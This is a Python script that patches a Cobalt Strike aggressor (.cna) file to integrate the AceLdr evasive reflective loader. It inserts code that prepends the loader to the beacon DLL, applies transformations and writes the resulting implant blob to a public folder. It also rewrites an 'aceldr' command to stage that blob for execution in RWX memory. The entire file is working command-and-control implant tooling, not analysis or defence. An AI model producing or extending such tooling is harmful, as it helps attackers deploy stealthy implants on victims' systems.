# -*- coding: utf-8 -*-
r"""patch_aceldr2.py - robust line-based patch for the AceLdr integration."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts"
     r"\p3-llvm-bench\tsboot_run\headless_franken.cna")
s = io.open(P, encoding="utf-8-sig").read()

L = chr(10)
TAB = chr(9)

# 1. globals after the $udrl_o_path line
i = s.find("$udrl_o_path = ")
assert i > 0, "udrl_o_path not found"
j = s.find(L, i)
gline = s[i:j]
ins = (gline + L +
       "$g_aceldr = 0;   # R2-2b: AceLdr prepend-mode flag (set by aceldr cmd)" + L +
       '$aceldr_bin = "C:' + chr(92) * 4 + 'Users' + chr(92) * 4 + 'Public' +
       chr(92) * 4 + 'aceldr' + chr(92) * 4 + 'AceLdr.x64.bin";')
s = s[:i] + ins + s[j:]
print("globals inserted after:", gline[:60])

# 2. AceLdr branch right after the hook's beacon-branch opening line
hook_line = (TAB + 'if (indexOf($1, "beacon") >= 0 || indexOf($1, "winhttpb") >= 0' + L +
             TAB + TAB + '|| indexOf($1, "dnsb") >= 0 || indexOf($1, "pivot") >= 0 || indexOf($1, "extc2") >= 0) {')
k = s.find(hook_line)
if k < 0:
    hook_line = TAB + 'if (indexOf($1, "beacon") >= 0 || indexOf($1, "winhttpb") >= 0 || indexOf($1, "dnsb") >= 0 || indexOf($1, "pivot") >= 0 || indexOf($1, "extc2") >= 0) {'
    k = s.find(hook_line)
assert k > 0, "hook opening line not found"
end_of_line = s.find(L, k)
B4 = chr(92) * 4
branch = (
    L +
    TAB + TAB + '# R2-2b AceLdr prepend mode: blob = [raw ACELDR loader][beacon DLL]' + L +
    TAB + TAB + '# ($2 = size-0 customDLL; setup_strings first, transforms last).' + L +
    TAB + TAB + 'if ($g_aceldr == 1 && $3 eq "x64") {' + L +
    TAB + TAB + TAB + '$ldr = readb(openf($aceldr_bin), -1);' + L +
    TAB + TAB + TAB + '$sdll = setup_strings($2);' + L +
    TAB + TAB + TAB + '$blob = $ldr . $sdll;' + L +
    TAB + TAB + TAB + '$out = setup_transformations($blob, $3);' + L +
    TAB + TAB + TAB + 'writeb(openf(">C:' + B4 + 'Users' + B4 + 'Public' + B4 +
         'aceldr' + B4 + 'aceldr_blob.bin"), $out);' + L +
    TAB + TAB + TAB + 'println("[UDRL-ACELDR] ldr=" . strlen($ldr) . " dll=" . strlen($sdll) . " blob=" . strlen($out));' + L +
    TAB + TAB + TAB + 'return $out;' + L +
    TAB + TAB + '}'
)
s = s[:end_of_line] + branch + s[end_of_line:]
print("hook branch inserted at", end_of_line)

# 3. replace the aceldr command body (from 'else if ($cmd eq "aceldr") {' to its closing)
cmd_open = TAB + 'else if ($cmd eq "aceldr") {' + L
ci = s.find(cmd_open)
assert ci > 0, "aceldr command not found"
close_marker = L + TAB + '}' + L
cj = s.find(close_marker, ci)
assert cj > ci, "aceldr command close not found"
cj += len(close_marker)

B4 = chr(92) * 4
new_cmd = (
    TAB + 'else if ($cmd eq "aceldr") {' + L +
    TAB + TAB + '# R2-2b: AceLdr prepend blob via GENERATE hook; deploy via' + L +
    TAB + TAB + '# probe_runner (flat RWX + thread at blob[0]).' + L +
    TAB + TAB + '$g_aceldr = 1;' + L +
    TAB + TAB + '$null = artifact_payload($a1, "dll", "x64");' + L +
    TAB + TAB + '$g_aceldr = 0;' + L +
    TAB + TAB + '$bp = "C:' + B4 + 'Users' + B4 + 'Public' + B4 + 'aceldr' + B4 + 'aceldr_blob.bin";' + L +
    TAB + TAB + 'if (-exists $bp) {' + L +
    TAB + TAB + TAB + '$b = readb(openf($bp), -1);' + L +
    TAB + TAB + TAB + 'blog($bid, "aceldr: blob ready " . strlen($b) . "B - run probe_runner");' + L +
    TAB + TAB + '} else {' + L +
    TAB + TAB + TAB + 'blog($bid, "aceldr: hook did not produce blob");' + L +
    TAB + TAB + '}' + L +
    TAB + TAB + 'return;' + L +
    TAB + '}' + L
)
s = s[:ci] + new_cmd + s[cj:]
print("aceldr command replaced")

io.open(P, "w", encoding="utf-8-sig", newline="").write(s)
print("done")
